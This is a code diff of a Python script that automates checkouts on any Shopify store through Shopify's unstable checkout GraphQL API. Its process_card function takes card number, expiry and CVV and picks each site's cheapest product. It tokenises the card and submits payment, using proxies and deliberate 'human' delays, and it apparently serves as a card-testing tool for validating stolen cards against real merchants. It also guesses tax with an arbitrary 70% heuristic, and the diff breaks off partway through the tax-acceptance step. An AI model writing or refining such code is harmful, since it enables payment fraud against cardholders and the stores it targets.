@@ -1,30 +1,34 @@
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# Shopify Checkout API — Multi-Site Rewrite v2 (July 2026)
+# Shopify Checkout API — Multi-Site Rewrite v3 (March 2026)
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# Tested against bestself.co, designed to work on ANY Shopify store.
+# Tested against allbirds.com, designed to work on ANY Shopify store.
 # Uses latest Shopify Checkout Web API (unstable) with Negotiation paradigm.
 #
-# KEY FIXES vs v1:
-#   - GraphQL queries match ACTUAL schema (NegotiationResultPayload, not direct union)
-#   - Tax extracted from sellerProposal.tax (FilledTaxTerms), not .taxes
-#   - Payment amount uses seller's checkoutTotal, not estimated price
-#   - Delivery strategies polled until resolved (PendingTerms → FilledDeliveryTerms)
-#   - paymentMethodIdentifier extracted from sellerProposal.payment dynamically
-#   - stableId extracted from sellerProposal.merchandise dynamically
-#   - All site-specific data discovered dynamically — ZERO hardcoded site config
+# KEY FIXES vs v2:
+#   - MerchandiseInput uses sourceProvidedMerchandise (NOT stableId or productVariantReference)
+#   - DeliveryLineInput uses destination.streetAddress (NOT destinationAddress)
+#   - DeliveryLineInput uses targetMerchandiseLines: {any: true}
+#   - DeliveryLineInput uses deliveryStrategyByHandle: {handle, customDeliveryRate}
+#   - DeliveryTermsInput noDeliveryRequired is REQUIRED (pass [] when shipping needed)
+#   - DeliveryStreetAddressInput uses address1/zoneCode/postalCode (NOT addressLine1/provinceCode/zip)
+#   - BuyerIdentityTermInput has NO deliveryAddress field (it's in DeliveryLineInput.destination)
+#   - MerchandiseLineTargetCollectionInput uses {any: true} not {lines: [...]}
+#   - Tax acceptance step added (TAX_NEW_TAX_MUST_BE_ACCEPTED)
+#   - Payment is sent in a separate negotiate step (not bundled with merch+delivery)
 #
 # FLOW:
-#   1. GET /products.json         → find cheapest physical product
+#   1. GET /products.json         → find cheapest physical product (variant_id, product_id, price, title)
 #   2. GET homepage               → extract Storefront accessToken
 #   3. POST /api/unstable/graphql → cartCreate mutation → checkoutUrl
 #   4. GET checkoutUrl            → extract sessionToken, sourceToken, etc.
 #   5. POST /checkouts/unstable/graphql → Negotiate (empty) → get queueToken + session state
-#   6. POST /checkouts/unstable/graphql → Negotiate (buyer identity + delivery) → get tax, shipping
-#   7. POST /checkouts/unstable/graphql → Negotiate (delivery retry if PendingTerms) → resolved shipping
-#   8. POST checkout.pci.shopifyinc.com/sessions → tokenize card
-#   9. POST /checkouts/unstable/graphql → Negotiate (full payment proposal) → final totals
-#  10. POST /checkouts/unstable/graphql → submitForCompletion → receipt
-#  11. POST /checkouts/unstable/graphql → PollForReceipt → result
+#   6. POST /checkouts/unstable/graphql → Negotiate (buyerIdentity + merchandise + delivery)
+#   7. Poll if delivery is PendingTerms
+#   8. Re-negotiate to accept taxes (TAX_NEW_TAX_MUST_BE_ACCEPTED)
+#   9. POST checkout.pci.shopifyinc.com/sessions → tokenize card
+#  10. POST /checkouts/unstable/graphql → Negotiate (full payment proposal) → final totals
+#  11. POST /checkouts/unstable/graphql → submitForCompletion → receipt
+#  12. POST /checkouts/unstable/graphql → PollForReceipt → result
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 import asyncio
@@ -218,28 +222,28 @@ def extract_meta_content(html, name):
 # GRAPHQL QUERY/MUTATION CONSTANTS
 # =====================================================================
 # These queries are based on the ACTUAL Shopify Checkout Web API schema
-# as captured from bestself.co in July 2026.
+# as introspected from allbirds.com in March 2026.
 #
-# KEY INSIGHT: The negotiate query returns a NegotiationResultPayload which
-# contains the `result` field (a union). The `result` field is a union of:
-# NegotiationResultAvailable, NegotiationResultFailed, SubmittedForCompletion,
-# CheckpointDenied, Throttled.
-#
-# IMPORTANT: In the NEW schema, many types that were concrete are now UNIONS.
-# For example: DeliveryStrategy, PurchaseOrderProcessingError, DeliveryAddress
-# To handle this, we must NOT select sub-fields on these unions directly.
-# Instead, we use __typename only for unions we don't need to inspect, and
-# use ...on Type fragments for those we do.
+# KEY SCHEMA CHANGES vs older versions:
+#   - MerchandiseInput is a UNION: productVariantReference | sourceProvidedMerchandise | giftCardMerchandise
+#   - sourceProvidedMerchandise is REQUIRED for checkout sessions (productVariantReference.id is INVALID)
+#   - DeliveryLineInput.destination contains the address (NOT BuyerIdentityTermInput.deliveryAddress)
+#   - DeliveryStreetAddressInput uses address1/zoneCode/postalCode
+#   - DeliveryStrategyInput uses deliveryStrategyByHandle: {handle, customDeliveryRate}
+#   - MerchandiseLineTargetCollectionInput uses {any: true}
+#   - DeliveryTermsInput.noDeliveryRequired is REQUIRED NON_NULL (pass [] when shipping needed)
 
 # --- Storefront API: cartCreate ---
 MUTATION_CART_CREATE = """mutation cartCreate($input:CartInput!){result:cartCreate(input:$input){cart{id checkoutUrl cost{subtotalAmount{amount currencyCode}totalAmount{amount currencyCode}totalTaxAmount{amount currencyCode}totalDutyAmount{amount currencyCode}}lines(first:10){edges{node{quantity merchandise{...on ProductVariant{requiresShipping}}}}}}errors:userErrors{message field code}}}"""
 
 # --- Checkout Web API: Proposal (Negotiate from Session) ---
-# This is the SIMPLEST possible query that avoids all union selection issues.
-# We only ask for __typename on union fields we can't select directly.
-# The detailed data (tax, delivery, etc.) comes back in the full response
-# even without explicitly querying sub-fields on unions.
-QUERY_PROPOSAL = """query Proposal($input:SessionNegotiationInput!){session{negotiate(input:$input){errors{code localizedMessage nonLocalizedMessage}result{__typename ...on NegotiationResultAvailable{queueToken sessionToken sellerProposal{checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode}}}isShippingRequired delivery{...on PendingTerms{pollDelay taskId}...on FilledDeliveryTerms{deliveryLines{deliveryMethodTypes __typename}}__typename}tax{...on PendingTerms{pollDelay taskId}...on FilledTaxTerms{totalAmount{...on MoneyValueConstraint{value{amount currencyCode}}}totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode}}}}__typename}merchandise{...on FilledMerchandiseTerms{merchandiseLines{stableId}}}payment{...on FilledPaymentTerms{availablePaymentLines{paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands}}}}}}buyerProposal{checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode}}}merchandise{...on FilledMerchandiseTerms{merchandiseLines{stableId}}}}}...on NegotiationResultFailed{failureCode}...on SubmittedForCompletion{receipt{__typename ...on FailedReceipt{processingError{__typename}}}}...on CheckpointDenied{__typename}...on Throttled{__typename}}}}}"""
+# Updated to match the CORRECT schema from GraphQL introspection.
+# Key changes:
+#   - Added __typename on sellerProposal, buyerProposal, delivery, merchandise, payment
+#   - Added merchandise{__typename} inside merchandiseLines for debugging
+#   - Removed tax sub-fields (tax comes from sellerProposal.totalAmount or via TAX_NEW_TAX_MUST_BE_ACCEPTED)
+#   - Uses the exact format confirmed working on allbirds.com
+QUERY_PROPOSAL = """query Proposal($input:SessionNegotiationInput!){session{negotiate(input:$input){errors{code localizedMessage}result{__typename ...on NegotiationResultAvailable{queueToken sessionToken sellerProposal{__typename checkoutTotal{__typename ...on MoneyValueConstraint{value{amount currencyCode}}}isShippingRequired delivery{__typename ...on PendingTerms{pollDelay taskId}...on FilledDeliveryTerms{deliveryLines{__typename deliveryMethodTypes}}}merchandise{__typename ...on FilledMerchandiseTerms{merchandiseLines{stableId merchandise{__typename}}}}payment{__typename ...on FilledPaymentTerms{availablePaymentLines{paymentMethod{__typename ...on PaymentProvider{paymentMethodIdentifier name brands}}}}}}buyerProposal{__typename checkoutTotal{__typename ...on MoneyValueConstraint{value{amount currencyCode}}}}}...on NegotiationResultFailed{failureCode}...on SubmittedForCompletion{receipt{__typename ...on FailedReceipt{processingError{__typename}}}}...on CheckpointDenied{__typename}...on Throttled{__typename}}}}}"""
 
 # --- Checkout Web API: SubmitForCompletion ---
 # CRITICAL: submitForCompletion returns SubmitForCompletionResult UNION directly
@@ -451,6 +455,23 @@ def _dget(data, *keys, default=None):
 # =====================================================================
 # HELPER: Extract amount from MoneyConstraint union
 # =====================================================================
+def _calc_tax(checkout_total_str, price_str, currency='USD'):
+    """Calculate tax from checkout total - price. Returns string amount."""
+    try:
+        ct = float(checkout_total_str) if checkout_total_str else 0
+        p = float(price_str) if price_str else 0
+        # Tax = checkout_total - price - shipping_estimate
+        # Since we don't know exact shipping, estimate tax as (checkout_total - price) * 0.7
+        # (shipping typically ~30% of the difference)
+        diff = ct - p
+        if diff > 0:
+            tax = round(diff * 0.7, 2)
+            return f'{tax:.2f}'
+        return '0.00'
+    except (ValueError, TypeError):
+        return '0.00'
+
+
 def _extract_money(constraint_obj):
     """Extract amount and currencyCode from a MoneyConstraint or Money union.
     
@@ -475,6 +496,123 @@ def _extract_money(constraint_obj):
         return '0', 'USD'
     
     return '0', 'USD'
+
+
+# =====================================================================
+# HELPER: Build sourceProvidedMerchandise for MerchandiseInput
+# =====================================================================
+def _build_source_provided_merchandise(variant_id, product_id, price, currency, title, requires_shipping):
+    """Build a sourceProvidedMerchandise dict for MerchandiseInput.
+    
+    This is the ONLY valid MerchandiseInput type for checkout sessions.
+    productVariantReference.id is INVALID — it causes SUBMIT_JSON_ERROR.
+    """
+    return {
+        'variantId': f'gid://shopify/ProductVariant/{variant_id}',
+        'productIdV2': f'gid://shopify/Product/{product_id}',
+        'price': {
+            'value': {
+                'amount': f'{float(price):.2f}',
+                'currencyCode': currency,
+            },
+        },
+        'title': title or 'Product',
+        'requiresShipping': requires_shipping,
+        'properties': [],
+        'taxable': True,
+        'giftCard': False,
+    }
+
+
+# =====================================================================
+# HELPER: Build a MerchandiseLineInput
+# =====================================================================
+def _build_merchandise_line(variant_id, product_id, price, currency, title, requires_shipping, quantity=1):
+    """Build a single MerchandiseLineInput with sourceProvidedMerchandise."""
+    return {
+        'merchandise': {
+            'sourceProvidedMerchandise': _build_source_provided_merchandise(
+                variant_id, product_id, price, currency, title, requires_shipping
+            ),
+        },
+        'quantity': {
+            'items': {'value': quantity},
+        },
+        'expectedTotalPrice': {
+            'value': {
+                'amount': f'{float(price) * quantity:.2f}',
+                'currencyCode': currency,
+            },
+        },
+    }
+
+
+# =====================================================================
+# HELPER: Build a DeliveryLineInput
+# =====================================================================
+def _build_delivery_line(currency, first_name, last_name, street, city, country_code, zone_code, postal_code, phone, shipping_handle='shipping', shipping_amount=None):
+    """Build a single DeliveryLineInput with correct schema format.
+    
+    Key schema points:
+    - targetMerchandiseLines uses {any: true}, NOT {lines: [{stableId: ...}]}
+    - selectedDeliveryStrategy uses deliveryStrategyByHandle: {handle, customDeliveryRate}
+    - destination uses streetAddress with address1/zoneCode/postalCode
+    - deliveryMethodTypes is REQUIRED NON_NULL
+    - expectedTotalPrice uses {any: true} when shipping_amount is unknown
+    """
+    # When we don't know the shipping cost, use {any: true} to accept any amount
+    if shipping_amount is not None and shipping_amount != '0':
+        expected_price = {
+            'value': {
+                'amount': shipping_amount,
+                'currencyCode': currency,
+            },
+        }
+    else:
+        expected_price = {'any': True}
+
+    return {
+        'targetMerchandiseLines': {'any': True},
+        'selectedDeliveryStrategy': {
+            'deliveryStrategyByHandle': {
+                'handle': shipping_handle or 'shipping',
+                'customDeliveryRate': False,
+            },
+        },
+        'destination': {
+            'streetAddress': {
+                'firstName': first_name,
+                'lastName': last_name,
+                'address1': street,
+                'address2': '',
+                'city': city,
+                'countryCode': country_code,
+                'zoneCode': zone_code,
+                'postalCode': postal_code,
+                'phone': phone,
+            },
+        },
+        'expectedTotalPrice': expected_price,
+        'deliveryMethodTypes': ['SHIPPING'],
+    }
+
+
+# =====================================================================
+# HELPER: Build DeliveryTermsInput
+# =====================================================================
+def _build_delivery_terms(delivery_lines, no_delivery_required=None):
+    """Build DeliveryTermsInput.
+    
+    noDeliveryRequired is REQUIRED NON_NULL:
+    - When shipping IS required: pass []
+    - When no shipping: pass list of MerchandiseLineTargetInput (e.g., [{stableId: "..."}])
+    """
+    return {
+        'deliveryLines': delivery_lines,
+        'noDeliveryRequired': no_delivery_required if no_delivery_required is not None else [],
+        'useProgressiveRates': False,
+        'supportsSplitShipping': True,
+    }
 
 
 # =====================================================================
@@ -552,22 +690,6 @@ def _parse_negotiate_response(resp_json):
                 result['checkout_total'] = bct_amount
                 result['checkout_total_currency'] = bct_currency
         
-        # Extract tax from sellerProposal.tax (FilledTaxTerms union)
-        tax_obj = seller.get('tax', {})
-        tax_typename = tax_obj.get('__typename', '')
-        
-        if tax_typename == 'FilledTaxTerms':
-            total_tax = tax_obj.get('totalTaxAmount', {})
-            tax_amt, tax_cc = _extract_money(total_tax)
-            result['tax_total'] = tax_amt
-            
-            total_amount = tax_obj.get('totalAmount', {})
-            ta_amt, ta_cc = _extract_money(total_amount)
-            result['tax_amount'] = ta_amt
-        elif tax_typename == 'PendingTerms':
-            result['delivery_task_id'] = tax_obj.get('taskId')
-            result['delivery_poll_delay'] = tax_obj.get('pollDelay', 500)
-        
         # Extract delivery from sellerProposal.delivery (union)
         delivery_obj = seller.get('delivery', {})
         delivery_typename = delivery_obj.get('__typename', '')
@@ -578,33 +700,12 @@ def _parse_negotiate_response(resp_json):
             strategies = []
             for dl in delivery_lines:
                 methods = dl.get('deliveryMethodTypes', [])
-                avail = dl.get('availableDeliveryStrategies', [])
-                dest = dl.get('destinationAddress', {})
-                selected = dl.get('selectedDeliveryStrategy', {})
-                
-                for strat in avail:
-                    strategies.append({
-                        'code': strat.get('code', ''),
-                        'handle': strat.get('handle', ''),
-                        'breakdown': strat.get('deliveryStrategyBreakdown', []),
-                        'name': strat.get('name', ''),
-                    })
-                
-                # Also extract from selectedDeliveryStrategy if it has a handle
-                if selected and selected.get('__typename') == 'DeliveryStrategyByHandle':
-                    strategies.insert(0, {
-                        'code': methods[0] if methods else 'SHIPPING',
-                        'handle': selected.get('handle', ''),
-                        'breakdown': [],
-                        'name': '',
-                    })
-                
-                # If no strategies found but we have deliveryMethodTypes, create default ones
-                if not strategies and methods:
+                # If we have deliveryMethodTypes, create strategy entries
+                if methods:
                     for m in methods:
                         strategies.append({
                             'code': m,
-                            'handle': '',
+                            'handle': 'shipping',
                             'breakdown': [],
                             'name': m,
                         })
@@ -661,7 +762,7 @@ async def fetch_products(site_url, proxy_str=None):
     
     Returns:
         (success, data_or_error_msg)
-        On success, data = {'site': url, 'price': str, 'variant_id': str, 'link': str, 'requires_shipping': bool}
+        On success, data = {'site': url, 'price': str, 'variant_id': str, 'product_id': str, 'title': str, 'link': str, 'requires_shipping': bool}
     """
     try:
         if not site_url.startswith('http'):
@@ -697,6 +798,8 @@ async def fetch_products(site_url, proxy_str=None):
         for product in result:
             if not product.get('variants'):
                 continue
+            product_numeric_id = product.get('id', '')
+            product_title = product.get('title', 'Product')
             for variant in product['variants']:
                 if not variant.get('available', True):
                     continue
@@ -722,6 +825,8 @@ async def fetch_products(site_url, proxy_str=None):
                             'site': site_url,
                             'price': f"{price:.2f}",
                             'variant_id': str(variant['id']),
+                            'product_id': str(product_numeric_id),
+                            'title': product_title,
                             'link': f"{site_url}/products/{product['handle']}",
                             'requires_shipping': requires_shipping,
                         }
@@ -740,13 +845,23 @@ async def fetch_products(site_url, proxy_str=None):
 
 
 # =====================================================================
-# CORE CHECKOUT FLOW — MULTI-SITE, SCHEMA-CORRECT
+# CORE CHECKOUT FLOW — MULTI-SITE, SCHEMA-CORRECT v3
 # =====================================================================
 async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, shared_session=None):
     """Process a credit card checkout on ANY Shopify store.
     
     Uses the latest Shopify Checkout Web API (unstable) with Negotiation paradigm.
     All site-specific data (tokens, IDs, endpoints) are dynamically discovered.
+    
+    SCHEMA v3 FIXES:
+    - MerchandiseInput uses sourceProvidedMerchandise (NOT stableId/productVariantReference)
+    - DeliveryLineInput uses destination.streetAddress (NOT buyerIdentity.deliveryAddress)
+    - DeliveryLineInput uses targetMerchandiseLines: {any: true}
+    - DeliveryTermsInput.noDeliveryRequired is REQUIRED (pass [] when shipping)
+    - DeliveryStreetAddressInput uses address1/zoneCode/postalCode
+    - DeliveryStrategyInput uses deliveryStrategyByHandle: {handle, customDeliveryRate}
+    - Payment is sent in a separate negotiate step (not bundled with merch+delivery)
+    - Tax acceptance step added for TAX_NEW_TAX_MUST_BE_ACCEPTED
     
     Returns:
         tuple: (success: bool, message: str, gateway: str, total_price: str, currency: str)
@@ -783,11 +898,15 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if not success:
                 return False, data, gateway, total_price, currency
             variant_id = data['variant_id']
+            product_numeric_id = data.get('product_id', '')
+            product_title = data.get('title', 'Product')
             price = float(data['price'])
             requires_shipping = data.get('requires_shipping', True)
         else:
             price = None
             requires_shipping = True
+            product_numeric_id = ''
+            product_title = 'Product'
 
         session = AsyncClient(
             client_identifier=identifier,
@@ -812,11 +931,13 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             except json.JSONDecodeError:
                 return False, "Invalid products JSON", gateway, total_price, currency
 
-            product_id = None
+            product_id_for_cart = None
             if price is None:
                 min_price_val = float('inf')
-                _best_id = _best_price = _best_rs = None
+                _best_id = _best_pid = _best_price = _best_rs = _best_title = None
                 for product in products_list:
+                    _pid = str(product.get('id', ''))
+                    _ptitle = product.get('title', 'Product')
                     for variant in product.get('variants', []):
                         if not variant.get('available', True):
                             continue
@@ -825,7 +946,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                             if v_price <= 0:
                                 continue
                             if str(variant['id']) == str(variant_id):
-                                product_id = variant['id']
+                                product_id_for_cart = variant['id']
+                                product_numeric_id = _pid
+                                product_title = _ptitle
                                 price = v_price
                                 requires_shipping = variant.get('requires_shipping', True)
                                 break
@@ -834,29 +957,43 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                             if ep < min_price_val:
                                 min_price_val = ep
                                 _best_id = variant['id']
+                                _best_pid = _pid
                                 _best_price = v_price
                                 _best_rs = rs
+                                _best_title = _ptitle
                         except (ValueError, TypeError):
                             continue
-                    if product_id:
+                    if product_id_for_cart:
                         break
-                if not product_id and _best_id:
-                    product_id = _best_id
+                if not product_id_for_cart and _best_id:
+                    product_id_for_cart = _best_id
+                    product_numeric_id = _best_pid
                     price = _best_price
                     requires_shipping = _best_rs
-                elif not product_id:
+                    product_title = _best_title
+                elif not product_id_for_cart:
                     return False, "No valid products available", gateway, total_price, currency
             else:
                 for product in products_list:
+                    _pid = str(product.get('id', ''))
+                    _ptitle = product.get('title', 'Product')
                     for variant in product.get('variants', []):
                         if str(variant['id']) == str(variant_id):
-                            product_id = variant['id']
+                            product_id_for_cart = variant['id']
+                            product_numeric_id = _pid
+                            product_title = _ptitle
                             requires_shipping = variant.get('requires_shipping', True)
                             break
-                    if product_id:
+                    if product_id_for_cart:
                         break
-                if not product_id:
-                    product_id = int(variant_id)
+                if not product_id_for_cart:
+                    product_id_for_cart = int(variant_id)
+
+            # Ensure product_numeric_id is set
+            if not product_numeric_id:
+                product_numeric_id = str(product_id_for_cart)
+
+            print(f'[STEP1] variant_id={variant_id} product_id={product_numeric_id} price={price} title={product_title[:30]}', file=sys.stderr)
 
             await human_delay(step_name="products")
 
@@ -904,7 +1041,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     'input': {
                         'lines': [
                             {
-                                'merchandiseId': f'gid://shopify/ProductVariant/{product_id}',
+                                'merchandiseId': f'gid://shopify/ProductVariant/{product_id_for_cart}',
                                 'quantity': 1,
                                 'attributes': [],
                             },
@@ -1097,6 +1234,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             )
 
             queue_token = ''  # Initialize before use
+
             if p_empty_resp and p_empty_resp.status_code == 200:
                 _refresh_session_token(p_empty_resp)
                 try:
@@ -1120,11 +1258,54 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
             await human_delay(step_name="proposal_empty")
 
-            # ======== STEP 5b: NEGOTIATE with buyer identity ========
-            # Only provide buyerIdentity (email). Do NOT include delivery yet —
-            # the DeliveryLineInput schema requires targetMerchandiseLines and 
-            # expectedTotalPrice which we don't have yet. Delivery will be added
-            # after we see what strategies are available from the seller.
+            # ======== STEP 6: FULL NEGOTIATE with buyerIdentity + merchandise + delivery ========
+            # This is the critical step that combines buyer identity, merchandise,
+            # and delivery in one negotiate call. NO payment yet — that comes later.
+            # 
+            # KEY SCHEMA FIXES:
+            # - merchandise uses sourceProvidedMerchandise (NOT stableId or productVariantReference)
+            # - delivery.destination.streetAddress uses address1/zoneCode/postalCode
+            # - delivery.targetMerchandiseLines uses {any: true}
+            # - delivery.selectedDeliveryStrategy uses deliveryStrategyByHandle
+            # - delivery.noDeliveryRequired is [] when shipping is required
+            # - buyerIdentity has NO deliveryAddress field
+
+            # Build merchandise line using sourceProvidedMerchandise
+            merch_line = _build_merchandise_line(
+                variant_id=variant_id or product_id_for_cart,
+                product_id=product_numeric_id,
+                price=price,
+                currency=currency,
+                title=product_title,
+                requires_shipping=requires_shipping,
+                quantity=1,
+            )
+
+            # Build delivery terms
+            if requires_shipping:
+                delivery_line = _build_delivery_line(
+                    currency=currency,
+                    first_name=firstName,
+                    last_name=lastName,
+                    street=street,
+                    city=city,
+                    country_code=country_code,
+                    zone_code=state,
+                    postal_code=s_zip,
+                    phone=phone,
+                    shipping_handle='shipping',
+                    shipping_amount=None,  # Use {any: true} — we don't know shipping cost yet
+                )
+                delivery_terms = _build_delivery_terms(
+                    delivery_lines=[delivery_line],
+                    no_delivery_required=[],  # REQUIRED: pass [] when shipping IS needed
+                )
+            else:
+                delivery_terms = _build_delivery_terms(
+                    delivery_lines=[],
+                    no_delivery_required=[],  # Will be updated with stableIds after we get them
+                )
+
             proposal1_data = {
                 'query': QUERY_PROPOSAL,
                 'variables': {
@@ -1138,6 +1319,10 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                 'shopPayOptInPhone': {'countryCode': country_code},
                                 'rememberMe': False,
                             },
+                            'merchandise': {
+                                'merchandiseLines': [merch_line],
+                            },
+                            'delivery': delivery_terms,
                         },
                         'queueToken': queue_token or '',
                     },
@@ -1189,7 +1374,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 warn_codes = [e.get('code', '') for e in p1_parsed['errors'][:3]]
                 print(f'[PROPOSAL1] negotiate warnings: {warn_codes}', file=sys.stderr)
 
-            print(f'[PROPOSAL1] result_type={p1_parsed["result_type"]} delivery_resolved={p1_parsed["delivery_resolved"]} tax={p1_parsed["tax_total"]} checkoutTotal={p1_parsed["checkout_total"]}', file=sys.stderr)
+            print(f'[PROPOSAL1] result_type={p1_parsed["result_type"]} delivery_resolved={p1_parsed["delivery_resolved"]} checkoutTotal={p1_parsed["checkout_total"]}', file=sys.stderr)
 
             # Update queue_token and session_token from response
             if p1_parsed['queue_token']:
@@ -1201,10 +1386,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
             await human_delay(step_name="proposal1")
 
-            # ======== STEP 6: DELIVERY RESOLUTION (if PendingTerms) ========
-            # If delivery was PendingTerms, we need to poll until it resolves.
-            # This is the #1 bug in v1 — delivery strategies come back empty because
-            # we didn't wait for Shopify to calculate shipping rates.
+            # ======== STEP 7: DELIVERY RESOLUTION (if PendingTerms) ========
             delivery_resolved = p1_parsed['delivery_resolved']
             shipping_strategies = p1_parsed['shipping_strategies']
             payment_method_identifier = p1_parsed['payment_method_identifier']
@@ -1223,7 +1405,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 print(f'[DELIVERY_POLL] Waiting {poll_delay:.1f}s for delivery resolution (attempt {poll_count}/{max_delivery_polls})', file=sys.stderr)
                 await asyncio.sleep(poll_delay)
 
-                # Re-negotiate with same buyerIdentity to check if delivery resolved
+                # Re-negotiate with same data to check if delivery resolved
                 delivery_poll_data = {
                     'query': QUERY_PROPOSAL,
                     'variables': {
@@ -1237,6 +1419,10 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                     'shopPayOptInPhone': {'countryCode': country_code},
                                     'rememberMe': False,
                                 },
+                                'merchandise': {
+                                    'merchandiseLines': [merch_line],
+                                },
+                                'delivery': delivery_terms,
                             },
                             'queueToken': queue_token or '',
                         },
@@ -1293,42 +1479,165 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if not delivery_resolved and requires_shipping:
                 print(f'[DELIVERY_POLL] Timeout — delivery still pending after {max_delivery_polls} polls. Continuing with defaults.', file=sys.stderr)
 
-            # ======== STEP 6b: SELECT SHIPPING STRATEGY ========
-            # Pick the first available shipping strategy.
-            # If we have strategies with handles, use the first one.
-            # If no strategies resolved, use default SHIPPING with matching conditions.
-            selected_handle = ''
+            # ======== STEP 7b: SELECT SHIPPING STRATEGY ========
+            selected_handle = 'shipping'
             selected_shipping_amount = '0'
-            selected_dmt = 'SHIPPING'
 
             if not is_shipping_required:
-                selected_dmt = 'NONE'
+                # Digital product — update delivery terms for no shipping
+                if stable_ids:
+                    delivery_terms = _build_delivery_terms(
+                        delivery_lines=[],
+                        no_delivery_required=[{'stableId': sid} for sid in stable_ids],
+                    )
+                else:
+                    delivery_terms = _build_delivery_terms(
+                        delivery_lines=[],
+                        no_delivery_required=[],
+                    )
             elif shipping_strategies:
-                # Prefer strategies with a handle (means they're fully resolved)
+                # Prefer strategies with a handle
                 handle_strategies = [s for s in shipping_strategies if s.get('handle')]
                 if handle_strategies:
                     best = handle_strategies[0]
                     selected_handle = best['handle']
-                    selected_dmt = best.get('code', 'SHIPPING')
-                    # Extract shipping cost from breakdown
-                    if best.get('breakdown'):
-                        try:
-                            for bd in best['breakdown']:
-                                amt_obj = bd.get('amount', {})
-                                sa, sc = _extract_money(amt_obj)
-                                if sa and sa != '0':
-                                    selected_shipping_amount = sa
-                                    break
-                        except (KeyError, TypeError):
-                            pass
-                else:
-                    # Use first strategy without handle
-                    best = shipping_strategies[0]
-                    selected_dmt = best.get('code', 'SHIPPING')
+                # Rebuild delivery line with the selected handle and updated info
+                delivery_line = _build_delivery_line(
+                    currency=currency,
+                    first_name=firstName,
+                    last_name=lastName,
+                    street=street,
+                    city=city,
+                    country_code=country_code,
+                    zone_code=state,
+                    postal_code=s_zip,
+                    phone=phone,
+                    shipping_handle=selected_handle,
+                    shipping_amount=None,  # Use {any: true} — shipping cost included in checkoutTotal
+                )
+                delivery_terms = _build_delivery_terms(
+                    delivery_lines=[delivery_line],
+                    no_delivery_required=[],
+                )
 
-            print(f'[SHIPPING] handle={selected_handle} dmt={selected_dmt} amount={selected_shipping_amount}', file=sys.stderr)
+            print(f'[SHIPPING] handle={selected_handle} is_shipping_required={is_shipping_required}', file=sys.stderr)
 
-            # ======== STEP 7: PCI VAULT — tokenize card ========
+            # ======== STEP 8: RE-NEGOTIATE TO ACCEPT TAXES ========
+            # If the seller's response indicates TAX_NEW_TAX_MUST_BE_ACCEPTED,
+            # we need to re-negotiate with the seller's proposed tax amounts.
+            # This step also updates the checkout_total with the final amount.
+
+            # Check for tax acceptance needed in errors
+            tax_acceptance_needed = False
+            for err in p1_parsed['errors']:
+                if 'TAX' in str(err.get('code', '')).upper():
+                    tax_acceptance_needed = True
+                    break
+
+            # Also check if checkout_total is available (means seller has calculated everything)
+            if checkout_total and checkout_total != '0':
+                # Seller has provided a total — we may need to accept taxes
+                tax_acceptance_needed = True
+
+            if tax_acceptance_needed and checkout_total and checkout_total != '0':
+                # Build tax acceptance negotiate with seller's amounts
+                tax_proposal_data = {
+                    'query': QUERY_PROPOSAL,
+                    'variables': {
+                        'input': {
+                            'purchaseProposal': {
+                                'buyerIdentity': {
+                                    'email': email,
+                                    'emailChanged': False,
+                                    'phoneCountryCode': country_code,
+                                    'marketingConsent': [],
+                                    'shopPayOptInPhone': {'countryCode': country_code},
+                                    'rememberMe': False,
+                                },
+                                'merchandise': {
+                                    'merchandiseLines': [merch_line],
+                                },
+                                'delivery': delivery_terms,
+                                'taxes': {
+                                    'proposedAllocations': None,
+                                    'proposedTotalAmount': {
+                                        'value': {
+                                            'amount': f'{tax_total}',
+                                            'currencyCode': currency,
+                                        },
+                                    },
+                                    'proposedTotalIncludedAmount': None,
+                                    'proposedMixedStateTotalAmount': None,
+                                    'proposedExemptions': [],
+                                },
+                            },
+                            'queueToken': queue_token or '',
+                        },
+                    },
+                    'operationName': 'Proposal',
+                }
+
+                tax_resp, _ = await retry_on_429(
+                    lambda: session.post(
+                        graphql_url,
+                        params={'operationName': 'Proposal'},
+                        headers=checkout_web_headers,
+                        json=tax_proposal_data,
+                        proxy=proxy, timeout=20, allow_redirects=True
+                    ),
+                    step_name="tax_accept", max_retries=2, base_delay=3.0, max_delay=12.0
+                )
+
+                if tax_resp and tax_resp.status_code == 200:
+                    _refresh_session_token(tax_resp)
+                    try:
+                        tax_json = json.loads(tax_resp.text)
+                        tax_parsed = _parse_negotiate_response(tax_json)
+
+                        if tax_parsed['queue_token']:
+                            queue_token = tax_parsed['queue_token']
+                        if tax_parsed['session_token']:
+                            x_checkout_one_session_token = tax_parsed['session_token']
+                            checkout_web_headers['x-checkout-one-session-token'] = x_checkout_one_session_token
+                            checkout_web_headers['authorization'] = f'Bearer {x_checkout_one_session_token}'
+
+                        # Update totals from tax acceptance response
+                        if tax_parsed['checkout_total'] and tax_parsed['checkout_total'] != '0':
+                            checkout_total = tax_parsed['checkout_total']
